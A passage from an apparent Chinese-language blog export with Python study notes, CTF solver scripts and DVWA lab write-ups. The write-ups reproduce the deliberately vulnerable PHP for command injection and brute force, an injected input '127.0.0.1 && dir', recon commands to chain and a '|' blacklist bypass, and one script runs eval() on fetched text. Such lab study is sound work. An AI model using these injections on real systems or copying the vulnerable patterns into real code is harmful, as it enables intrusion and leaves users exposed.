python/","link":"","permalink":"http://yoursite.com/2020/01/04/notes on python/","excerpt":"学习笔记以及一些自己写的小程序","text":"学习笔记以及一些自己写的小程序 [TOC] turtle绘图想小朋友学的东西，不过我也不会画蟒蛇： 1234567891011121314151617# pythonDraw.pyimport turtleturtle.setup(700,350,200)turtle.penup()#画笔抬起turtle.fd(-250)#前进turtle.pendown()turtle.pensize(25)turtle.pencolor(&quot;black&quot;)turtle.seth(-40)#表示运动方向，其中0表示东，90度向北，负值表示相反方向for i in range(4): turtle.circle(40,80)#turtle.circle(rad,angle)表示圆形爬行，若rad为负，则半径在小乌龟运行的右侧，angle表示爬行的角度 turtle.circle(-40,80)turtle.circle(50,80)turtle.fd(40)turtle.circle(16,180)turtle.fd(40*2/3)turtle.done() setup:设置窗体大小位置若不设置后面两个参数则默认在正中间；goto：海龟从当前位置去那个坐标（相对坐标）；绝对坐标（以海龟的方向为参考）：seth(angle)left(angle)right(angle):调整海龟角度颜色：RGB小数值turtle.colormode(mode):mode为1.0时 RGB小数值模式mode为255时 RGB整数模式 引入函数库：import turtle （不会出现函数重名，但每个函数前都要写库名）或者是from turtle import*（from &lt;库名&gt; import &lt;函数名&gt; ） （调用时不用再写库名,但是可能会和其他的函数重名）或是import &lt;库名&gt; as &lt;库别名&gt; （取个小名，既避免重复，又简化库名） sys模板Python模板之sys 类类的实例化操作会自动调用__init__()方法__init__可以方便地自己对类的属性进行定义，init()方法又被称为构造器（constructor）。使用了它就可以不用单独定义一个构造函数来初始化变量，方便操作。参考：https://blog.csdn.net/luzhan66/article/details/82822896该方法可以有参数，参数通过 __init__() 传递到类的实例化操作上 类的继承12345678910111213141516171819202122232425262728class student: name = &apos;&apos; __weight = 0 height = 0 age = 0 #这一段可以去掉，不影响结果 def __init__(self, n, w, h, a): #self是必须有的参数，不是关键字，也可以写成其他样子，代表类的实例 self.name = n self.__weight = w#私有属性 在继承类中不能调用 self.height = h self.age = a def speak(self): print(&quot;%s says &apos;I am %d years old %d tall %d weigh.&quot;%(self.name,self.age,self.height,self.__weight))s = student(&apos;tom&apos;,30,180,19)s.speak()class class1(student):#继承student grade = &apos;&apos; Class = 0 def __init__(self, n, w, h, a,g,c):#构造函数，在实例化对象时自动调用 student. __init__(self, n, w, h, a) self.grade = g self.Class = c def speak(self): print(&quot;%s says &apos;I am %d years old %d cm tall from class %d grade %s&quot;%(self.name,self.age,self.height,self.Class,self.grade))x = class1(&apos;sara&apos;,50,168,18,&apos;1&apos;,1)x.speak() 类的多继承：class DerivedClassName(Base1, Base2, Base3):子类使用时未指定，python从左至右搜索 即方法在子类中未找到时，从左到右查找父类中是否包含方法。 类的多继承super()函数可以用作用子类对象调用父类的方法； global 和 nonlocal关键字 global 用于内部（函数、类、模块（单个.py文件）改变全局变量nonlocal 用于修改嵌套作用域，nonlocal关键字用来在函数或其它作用域中使用外层（非全局）变量此外python中查找变量是局部找不到就会去相对当前的外部找，如果好还是没有就去全局找，再找不到就去内置中找； 迭代器与生成器生成器相当于一种迭代器迭代器常用函数：iter() next()斐波那契函数 123456789101112131415161718import sysdef fibonacci(n): a,b,count = 0,1,0 while True: #这里的True首字母大写 if (count&gt;n): return yield a a,b = b,a+b count+=1f = fibonacci(10) #f是一个迭代器，由生成器返回生成while 1: try: print(next(f),end=&quot; &quot;) except StopIteration: #Stopitera异常标识 sys.exit() 为什要用yiled而不直接打印 学委最后的倔强flashtext关键词检索匹配名单、班级、学号并规范文件名 每次收作业都要一个一个核对，找出没有交的，谁叫xun9er这么认真负责，所以写个收作业用的脚本好了：首先安装flashtext：pip install flashtext os.listdir(path) 返回path指定的文件夹包含的文件或文件夹的名字的列表。 os.renames(old, new) 递归地对目录进行更名，也可以对文件进行更名。 os.sep添加系统分隔符 把txt文件转成字典格式：定义一个空列表，按行读取txt文件，然后转换成嵌套列表，进而通过dict方法将嵌套列表转换成字典（左边为key,右边为value） 12345&gt;&gt;&gt;a = [&apos;a&apos;, &apos;b&apos;, &apos;c&apos;]&gt;&gt;&gt; n = [1, 2, 3]&gt;&gt;&gt; x = [a, n]&gt;&gt;&gt; x[[&apos;a&apos;, &apos;b&apos;, &apos;c&apos;], [1, 2, 3]] 1、现在是两个列表List的情况，一个List作为key、一个List作为value 123456789list1 = [&apos;key1&apos;,&apos;key2&apos;,&apos;key3&apos;]和list2 = [&apos;1&apos;,&apos;2&apos;,&apos;3&apos;]，把他们转为这样的字典：&#123;&apos;key1&apos;:&apos;1&apos;,&apos;key2&apos;:&apos;2&apos;,&apos;key3&apos;:&apos;3&apos;&#125;&gt;&gt;&gt;list1 = [&apos;key1&apos;,&apos;key2&apos;,&apos;key3&apos;]&gt;&gt;&gt;list2 = [&apos;1&apos;,&apos;2&apos;,&apos;3&apos;]&gt;&gt;&gt;dict(zip(list1,list2))&#123;&apos;key1&apos;:&apos;1&apos;,&apos;key2&apos;:&apos;2&apos;,&apos;key3&apos;:&apos;3&apos;&#125; 2、将嵌套列表转为字典的两种方法 12345&gt;&gt;&gt;new_list= [[&apos;key1&apos;,&apos;value1&apos;],[&apos;key2&apos;,&apos;value2&apos;],[&apos;key3&apos;,&apos;value3&apos;]]&gt;&gt;&gt;dict(list)&#123;&apos;key3&apos;: &apos;value3&apos;, &apos;key2&apos;: &apos;value2&apos;, &apos;key1&apos;: &apos;value1&apos;&#125; 显示已完成、未完成名单： 123456789101112131415161718192021222324252627282930313233343536373839404142import osimport refrom flashtext import KeywordProcessorfile_path=&quot;（作业文件夹路径）&quot;# 如果目录名字为中文 需要转码处理 如下：# file_Path = unicode(file_Path,&apos;utf-8 &apos;)name_path=&apos;（名单txt文件的路径，）&apos;dirs=os.listdir(file_path)#合并为字符串text=&quot;&quot;.join(dirs)#把除汉字的部分替换成空格（如果汉字直接链接数字，后面就检索不了）pure_text = re.sub(&quot;[\\d\\(A-Za-z)\\(.)\\s\\[\\]\\-]&quot;,&quot; &quot;,text)#从文件里导入关键字name并转化成listtry: #防止读写出错时不调用name.close f=open(name_path,mode=&apos;r&apos;,encoding = &quot;utf-8&quot; ) context=f.read()#读取 list_name=context.split(&quot;\\n&quot;)#分割为list length=len(list_name)finally: if f: f.close()#关闭#添加关键词字典（list）keyword_processor=KeywordProcessor()keyword_processor.add_keywords_from_list(list_name)#在字符串pure_text中查找判断有无关键词list_namesub_name=keyword_processor.extract_keywords(pure_text)print (&apos;已交作业的同学有：\\n&apos;)print (sub_name)print (&quot;\\n总计：&quot; , len(sub_name) , &quot;(人)\\n&quot;)usub_name = [x for x in list_name if x not in sub_name]print(&apos;未交作业的同学有：\\n&apos;)print (usub_name)print (&quot;\\n总计：&quot; , len(usub_name) , &quot;(人)&quot;) 宝贝儿们个性张扬，作业文件名总是五花八门，虽然xun9er一再强调要按格式命名，按格式，按格式！ex：害~ 所以来个格式整理。 （班级-学号-姓名） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081import osimport refrom flashtext import KeywordProcessorstuClass=&apos;*&apos;#班级homeworkPath=&quot;*&quot;#作业文件目录# 如果目录名字为中文 需要转码处理# uPath = unicode(cPath,&apos;utf-8&apos;)namePath=&apos;*&apos;#名单txt文件路径numberPath=&apos;*&apos;#学号txt文件路径fileFormat=&apos;*&apos;#作业文件扩展名#获取文件名为列表dirsdirs=os.listdir(homeworkPath)#合并为字符串text=&quot;&quot;.join(dirs)#把除汉字的部分替换成空格（如果汉字直接链接数字，后面就检索不了）pureText = re.sub(&quot;[\\d\\(A-Za-z)\\(.)\\s\\[\\]\\-]&quot;,&quot; &quot;,text)#从文件里导入关键字name并转化成listtry: #防止读写出错时不调用name.close f=open(namePath,mode=&apos;r&apos;,encoding = &quot;utf-8&quot; ) context=f.read()#读取 list_name=context.split(&quot;\\n&quot;)#分割为list length=len(list_name)finally: if f: f.close()#关闭#添加关键词字典keyword_processor=KeywordProcessor()prosser1=keyword_processor.add_keywords_from_list(list_name)#在字符串pure_text中查找判断有无关键词list_namesubName=keyword_processor.extract_keywords(pureText)print (&apos;已交作业的同学有：\\n&apos;)print (subName)print (&quot;\\n总计：&quot; , len(subName) , &quot;(人)\\n&quot;)usubName = [x for x in list_name if x not in subName]print(&apos;未交作业的同学有：\\n&apos;)print (usubName)print (&quot;\\n总计：&quot; , len(usubName) , &quot;(人)\\n&quot;)#统一文件名 #导入学号try: f=open(numberPath,mode=&apos;r&apos;,encoding = &quot;utf-8&quot; ) context=f.read()#读取 listNumber=context.split(&quot;\\n&quot;)#分割为list length=len(listNumber)finally: if f: f.close()#关闭stuDict=dict(zip(list_name,listNumber))#构造字典 名字：学号n=0#更新名字for i in dirs: usedName = homeworkPath+os.sep+dirs[n] pureName= re.sub(&quot;[\\d\\(A-Za-z)\\(.)\\s\\[\\]\\-]&quot;,&quot; &quot;,usedName)#和之前一样，为了防止数字和汉字连接时检索不了 keyNameList =keyword_processor.extract_keywords(pureName)#返回的是一个文件名中的人名数组 keyName=keyNameList[0] newName = homeworkPath+ os.sep +stuClass +&apos;-&apos;+stuDict[keyName] + &apos;-&apos;+keyName +&apos;.&apos;+fileFormat os.rename(usedName,newName) print(usedName+&apos;======&gt;&apos;+newName) n+=1print(&quot;\\nbingo！规范文件名完成~\\n&quot;) 舒服。参考： python 判断两个列表中相同和不同的元素Python之多个List或嵌套List转为Dict字典的方式（转载）python︱flashtext高效关键词查找与替换 快速反弹request请求–requests库下载：在python终端目录下pip install requests注：要关掉所有代理，否则会报“目标服务器积极拒绝，无法连接”。 bugku秋明山车神123456789101112131415import requestsimport re#r = requests.get(&apos;https://github.com/&apos;)#s = r.request.headersurl = &apos;http://123.206.87.240:8002/qiumingshan/&apos;session=requests.session()source=session.get(url)expression=re.search(r&apos;(\\d+[+\\*-])+(\\d+)&apos;,source.text).group()#r.text返回文本 group()返回整个字符串value=eval(expression)#计算r=session.post(url,data=&#123;&apos;value&apos;:value&#125;)print (r.text) 因为每次发起请求计算式都会变（访问一次、提交参数一次），所以需要使用session()。 requests库python中运到过得text和text()python group()requests中session的用法CTF 中的快速反弹post请求 bugku速度要快base64加密、解密在base64加密时由于使用的是python3，python3是Unicode编码而b64encode函数的参数为byte类型，所以必须先转码。 12345import requestsimport base64string=&apos;hahahha&apos;s=base64.b64encode(string.encode(&apos;utf-8&apos;))print(s) 显示的b是指它为byte类型，所以再转一次码： 12345import requestsimport base64string=&apos;hahahha&apos;s=base64.b64encode(string.encode(&apos;utf-8&apos;))print(str(s,&apos;utf-8&apos;)) 题目抓包后heasder有一个base64加密的flag，解密后后面还是一个base64，所以需要取“:”后的内容进行二次解密。是要在短时间内提交解密后flag的值，提交参数为margin。这里不需要用上面的说得类型转换，byte类型也可以传上去。 1234567891011121314import requestsimport base64url = &quot;http://123.206.87.240:8002/web6/&quot;s = requests.session()source = s.get(url).headers#source为一个字典str1 = base64.b64decode(source[&apos;flag&apos;])str2 = base64.b64decode(repr(str1).split(&quot;:&quot;)[1])#repr()把对象转化为字符串data = &#123;&apos;margin&apos;:str2&#125;r=s.post(url,data=data)print (r.text) 爬虫首先要用到：pip ==下载=》 beautiful soup、lxm 四大对象种类 Tag NavigableString BeautifulSoup Comment Tag–标签两个重要的属性：name ：名字attrs ：属性 NavigableString如果要获取标签内部的文字，用 .string 即可，它的类型是一个 NavigableString。 BeautifulSoupBeautifulSoup 对象表示的是一个文档的全部内容.大部分时候,可以把它当作 Tag 对象，是一个特殊的 Tag，我们可以分别获取它的类型，名称，以及属性。 CommentComment 对象是一个特殊类型的 NavigableString 对象，其实输出的内容仍然不包括注释符号，但是如果不好好处理它，可能会对我们的文本处理造成意想不到的麻烦。 一些可能用到的函数repr(object) 函数将对象转化为供解释器读取的形式。compile() 函数将一个字符串编译为字节代码。format 格式化函数:get()函数：以classCount.get(voteIlabel,0)为例：classCount.get(voteIlabel,0)返回字典classCount中voteIlabel元素对应的值,若无，则进行初始化 12&gt;&gt;&gt; &quot;&#123;1&#125; &#123;0&#125; &#123;1&#125;&quot;.format(&quot;hello&quot;, &quot;world&quot;) # 设置指定位置&apos;world hello world&apos; 官网beautifulsoup菜鸟教程 爬取头条图片首先在网络（Network）里找到包含所有页面资源的json，在参数里看它的参数并构造url观察发现json的图片是在{1}-&gt;data-&gt;iamge_list里虽然写得相当丑陋，但也是朕的宝贝儿： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import requestsfrom urllib.parse import urlencode#设置参数def offset_url(url): para=&#123; &apos;offset&apos;:0, &apos;format&apos;:&apos;json&apos;, &apos;keyword&apos;:&apos;厚涂&apos;, &apos;autoload&apos;:&apos;true&apos;, &apos;count&apos;:20, &apos;en_qc&apos;:1, &apos;cur_tab&apos;:1, &#125; new_url=url+&apos;?&apos;+urlencode(para) source= requests.get(new_url).json() return source#获取图片网址def get_url(source): for data in source[&apos;data&apos;]: if &quot;large_image_url&quot;in data: image = data[&apos;image_list&apos;] for img in image: img_url=img[&apos;url&apos;] img_url_list.append(img_url) return img_url_list#下载图片def get_html(img_url): headers=&#123;&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0&quot;&#125; html = requests.get(img_url) return html if __name__ == &apos;__main__&apos;: url=&apos;https://www.toutiao.com/api/search/content&apos; img_url_list=[] num=1 img_url_list=get_url(offset_url(url)) for img_url in img_url_list: html=get_html(img_url) with open(f&apos;C:/Users/home/Desktop/123/img&#123;num&#125;.jpg&apos;, &apos;wb&apos;) as f: f.write(html.content) print(&quot;下载第&quot;+f&apos;&#123;num&#125;&apos;+&quot;张图片&quot;) num+=1 为什么要用“if name==main”:当.py文件被直接运行时，if name == ‘main‘之下的代码块将被运行；当.py文件以模块形式被导入时，if name == ‘main‘之下的代码块不被运行。如果你经常以cmd方式运行自己写的python小脚本，那么不需要这个东西，但是如果需要做一个稍微大一点的python开发，写 if name ==’main__’ 是一个良好的习惯，大一点的python脚本要分开几个文件来写，一个文件要使用另一个文件，也就是模块，此时这个if就会起到作用不会运行而是类似于文件包含来使用。摘自：flask之ssti模版注入从零到入门 flask网页渲染文件名（固定）：templates方法：render_template()导入：from flask import render_template 传参：变量： render_template(“hello.html”,html内变量名name1=python内变量名name2) 变量html内接收flask接收的变量: 列表遍历123&#123;% for item in list% &#125;#开始 （内容） &#123;% endfor %&#125;#结束 debugapp.debug = True加上后就不用每次都运行一次程序。 监听所有公网ipapp.run(host=&#39;0.0.0.0&#39;)","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"DVWA-command injection","slug":"DVWA-command-injection","date":"2020-01-04T13:05:54.000Z","updated":"2020-01-04T14:03:48.093Z","comments":true,"path":"2020/01/04/DVWA-command-injection/","link":"","permalink":"http://yoursite.com/2020/01/04/DVWA-command-injection/","excerpt":"DVWA-Command Injection","text":"DVWA-Command Injection easy 123456789101112131415161718192021&lt;?phpif( isset( $_POST[ &apos;Submit&apos; ] ) ) &#123; // Get input $target = $_REQUEST[ &apos;ip&apos; ]; // Determine OS and execute the ping command. if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) &#123; // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt; stristr(string,search,before_search):搜索字符串在另一字符串中的第一次出现。注释：该函数是二进制安全的。注释：该函数是不区分大小写的。如需进行区分大小写的搜索，请使用 strstr() 函数。 php_uname（[字符串$ mode = “ a” ）返回运行PHP的操作系统的描述mode 是定义返回哪些信息的单个字符：‘a’：这是默认值。包含序列“ snrv m”中的所有模式。‘s’：操作系统名称。例如。FreeBSD。‘n’：主机名。例如。localhost.example.com。‘r’：发行名称。例如。5.1.2-发布。‘v’：版本信息。操作系统之间的差异很大。‘m’：机器类型。例如。i386。 123&lt;?phpecho php_uname(&apos;s&apos;);?&gt; shell_exec()函数shell_exec ( string $cmd ) : stringcmd：要执行的命令命令执行的输出。 如果执行过程中发生错误或者进程不产生输出，则返回 NULL。通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。也就是说, PHP先运行一个shell环境, 然后让shell进程运行你的命令, 并且把所有输出以字符串形式返回, 如果程序执行有错误或者程序没有任何输出, 则返回null. 版本：PHP 4, PHP 5, PHP 7 Note:当 PHP 运行在 安全模式 时，不能使用此函数。php执行系统命令的四个函数shell_exec, exec, passthru, system shell_exec()函数和执行运算符有相同的作用。执行运算符：就是反引号（``），PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。使用反引号运算符的效果与函数 shell_exec() 相同。 理解：这里先通过pup_uname()判断操作系统，若为win则执行第一种情况，若为其他的（linux）执行第二种，加上-c选项，因为linux中ping命令是一直执行的。只有加了-c指定发送的跳数才能停止。easy的代码没有对用户的输入进行任何处理。 常见的拼接命令： ipconfig 查看本地网络 net user 查看系统用户 dir 查看当前目录 find 查找包含指定字符的行 whoami 查看系统当前有效用户名（dvwa乱码问题：修改dvwa/include/dvwaPage.inc.php 中所有的charset=UTF-8为charset=gb2312） medium 123456789101112131415161718192021222324252627282930&lt;?phpif( isset( $_POST[ &apos;Submit&apos; ] ) ) &#123; // Get input $target = $_REQUEST[ &apos;ip&apos; ]; // Set blacklist $substitutions = array( &apos;&amp;&amp;&apos; =&gt; &apos;&apos;, &apos;;&apos; =&gt; &apos;&apos;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) &#123; // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt; str_replace(find,replace,string,count) find 必需。规定要查找的值。 replace 必需。规定替换 find 中的值的值。 string 必需。规定被搜索的字符串。 count 可选。对替换数进行计数的变量。 该函数区分大小写。请使用 str_ireplace() 函数执行不区分大小写的搜索。 该函数二进制安全。PHP版本：4+ 这里设置黑命单的有“&amp;&amp;”、“;” 123456789&lt;?php $substitutions = array( &apos;&amp;&amp;&apos; =&gt; &apos;&apos;, &apos;;&apos; =&gt; &apos;&apos;, ); $target=&quot;127.0.0.1 &amp;&amp; dir&quot;; $target=str_replace(array_keys($substitutions), $substitutions, $target);echo ($target); ?&gt; 连接符号被消去 这里使用黑名单过滤了一些字符，但还有一些没被去掉比如“|”号； high 1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpif( isset( $_POST[ &apos;Submit&apos; ] ) ) &#123; // Get input $target = trim($_REQUEST[ &apos;ip&apos; ]); // Set blacklist $substitutions = array( &apos;&amp;&apos; =&gt; &apos;&apos;, &apos;;&apos; =&gt; &apos;&apos;, &apos;| &apos; =&gt; &apos;&apos;, &apos;-&apos; =&gt; &apos;&apos;, &apos;$&apos; =&gt; &apos;&apos;, &apos;(&apos; =&gt; &apos;&apos;, &apos;)&apos; =&gt; &apos;&apos;, &apos;`&apos; =&gt; &apos;&apos;, &apos;||&apos; =&gt; &apos;&apos;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) &#123; // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt; 黑名单的内容增加了很多，不过其中 “ ‘| ‘ =&gt; ‘’,”里“|”后面多了一个“ ”，所以如果去掉空格： impossible 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpif( isset( $_POST[ &apos;Submit&apos; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Get input $target = $_REQUEST[ &apos;ip&apos; ]; $target = stripslashes( $target ); // Split the IP into 4 octects $octet = explode( &quot;.&quot;, $target ); // Check IF each octet is an integer if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123; // If all 4 octets are int&apos;s put the IP back together. $target = $octet[0] . &apos;.&apos; . $octet[1] . &apos;.&apos; . $octet[2] . &apos;.&apos; . $octet[3]; // Determine OS and execute the ping command. if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) &#123; // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;; &#125; else &#123; // Ops. Let the user name theres a mistake echo &apos;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&apos;; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 用了Anti-CSRF令牌防止CSRF；没有使用黑名单方式，而是把用户输入的ip进行拆分验证是否是ip的正确格式。参考：巧用命令注入的N种方式","categories":[],"tags":[]},{"title":"DVWA--brute","slug":"DVWA-brute","date":"2020-01-04T08:53:44.000Z","updated":"2020-01-08T08:47:35.597Z","comments":true,"path":"2020/01/04/DVWA-brute/","link":"","permalink":"http://yoursite.com/2020/01/04/DVWA-brute/","excerpt":"DVWA--Brute Force","text":"DVWA--Brute Force brute easy 123456789101112131415161718192021222324252627282930313233&lt;?phpif( isset( $_GET[ &apos;Login&apos; ] ) ) &#123; // Get username $user = $_GET[ &apos;username&apos; ]; // Get password $pass = $_GET[ &apos;password&apos; ]; $pass = md5( $pass ); // Check the database $query = &quot;SELECT * FROM `users` WHERE user = &apos;$user&apos; AND password = &apos;$pass&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else &#123; // Login failed echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; &lt;pre&gt;标签： 标记定义预格式化的文本。 元素中的文本以固定宽度的字体（通常为Courier）显示，并且保留空格和换行符。 支持HTML中的全局属性和事件属性 当显示格式不正常的文本或某种计算机代码时，请使用 &lt;pre&gt; 元素 HTML5不支持“宽度”属性我是黑体 mysqli_query(connection,query,resultmode);：进行一次数据库查询 mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;]转义 is_object() 函数用于检测变量是否是一个对象如果指定变量为对象，则返回 TRUE，否则返回 FALSE。 ‘?’的意思：三目运算，条件一?条件二：条件三，当条件一成立时，问号的作用是选择条件二作为程序继续执行的分支。也就是说，条件一成立，就执行条件二，否则执行条件三。 mysqli_error() 函数返回最近调用函数的最后一个错误描述。返回一个带有错误描述的字符串。如果没有错误发生则返回 “”PHP版本：5+ mysqli_connect_error() 函数返回上一次连接错误的错误描述。返回一个描述错误的字符串。如果没有错误就返回NULLPHP版本：5+ die()是exit()的别名 函数输出一条消息，并退出当前脚本。如果 status 是字符串，则该函数会在退出前输出字符串。如果 status 是整数，这个值会被用作退出状态。退出状态的值在 0 至 254 之间。退出状态 255 由 PHP 保留，不会被使用。状态 0 用于成功地终止程序。（如果PHP版本号大于4.2.0，不会输出该参数） mysqli_num_rows（）函数返回结果集中的行数。 mysqli_fetch_assoc(result);从结果集中取得一行作为关联数组,返回的字段名区分大小。result必需。规定由 mysqli_query()、mysqli_store_result() 或 mysqli_use_result() 返回的结果集标识符。返回代表读取行的关联数组。如果结果集中没有更多的行则返回 NULL。PHP版本：5+ mysqli_close() 函数关闭先前打开的数据库连接。如果成功则返回 TRUE，如果失败则返回 FALSE。PHP版本：5+ is_null() 函数用于检测变量是否为 NULL。 easy brute没有任何过滤，数据库中有如果用户输入的用户名及对应密码，就直接返回结果。 本地抓包首先看Firefox代理中是不是设置了本地不使用代理，然而发现本来就是空的；URL栏中输入about:config，打开配置页；在配置页的搜索栏搜索network.proxy.allow_hijacking_localhost，找到该配置项，双击设置为true即可。参考：https://blog.csdn.net/XavierDarkness/article/details/91410910 medium 123456789101112131415161718192021222324252627282930313233343536&lt;?phpif( isset( $_GET[ &apos;Login&apos; ] ) ) &#123; // Sanitise username input $user = $_GET[ &apos;username&apos; ]; $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitise password input $pass = $_GET[ &apos;password&apos; ]; $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // Check the database $query = &quot;SELECT * FROM `users` WHERE user = &apos;$user&apos; AND password = &apos;$pass&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else &#123; // Login failed sleep( 2 ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; mysqli_real_escape_string(connection,escapestring) 转义字符串中的特殊字符。connection 必需。规定要使用的 MySQL 连接。escapestring 必需。要转义的字符串。编码的字符是 NUL（ASCII 0）、\\n、\\r、\\、’、” 和 Control-Z。 和easy相比较对用户民和密码分别多了一次转义，可以过滤掉NUL（ASCII 0）、\\n、\\r、\\、’、” 和 Control-Z防止一些SQL注入。 difficult 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpif( isset( $_GET[ &apos;Login&apos; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Sanitise username input $user = $_GET[ &apos;username&apos; ]; $user = stripslashes( $user ); $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitise password input $pass = $_GET[ &apos;password&apos; ]; $pass = stripslashes( $pass ); $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // Check database $query = &quot;SELECT * FROM `users` WHERE user = &apos;$user&apos; AND password = &apos;$pass&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = 